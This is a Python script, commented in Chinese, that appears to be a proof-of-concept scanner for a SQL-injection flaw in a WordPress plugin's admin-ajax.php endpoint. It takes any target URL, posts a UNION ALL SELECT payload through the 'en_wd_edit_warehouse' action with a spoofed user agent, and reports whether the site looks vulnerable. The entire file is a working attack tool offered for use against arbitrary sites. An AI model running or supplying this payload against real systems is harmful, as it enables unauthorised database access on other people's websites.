import requests
import argparse
from faker import Faker

fake = Faker()
# 创建命令行参数解析器
parser = argparse.ArgumentParser(description='发送带有指定URL的POST请求。存在问题的路径为/wp-admin/admin-ajax.php',formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('-u', '--url', type=str, help='输入目标url发送post请求')

args = parser.parse_args()

if args.url:
    if args.url.endswith('/'):
        url = args.url[:-1] + "/wp-admin/admin-ajax.php"  # 移除末尾的斜杠
    else:
        url = args.url + "/wp-admin/admin-ajax.php"
else:
    print("Please provide a valid URL using -u or --url argument.")
    exit()

headers = {
    'User-Agent': fake.user_agent(),
    'Connection': 'close',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept-Encoding': 'gzip'
}

data = {
    'action': 'en_wd_edit_warehouse',
    'edit_id': '1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7170787171,0x6e57584a4f524f56504572467179796c6a6c6c527872646a73464444414144707067736542565243,0x717a627171),NULL,NULL,NULL,NULL,NULL-- -',
    'wp_nonce': '13db5f2e7d'
}

response = requests.post(url, headers=headers, data=data)
if "id" in response.text:
    print("目标url："+ url + '\n' +"可能存在该漏洞"+ '/n'+ '返回内容为' + response.text)
else:
    print("目标url："+ url + '\n' +"不存在该漏洞")
# print(response.text)
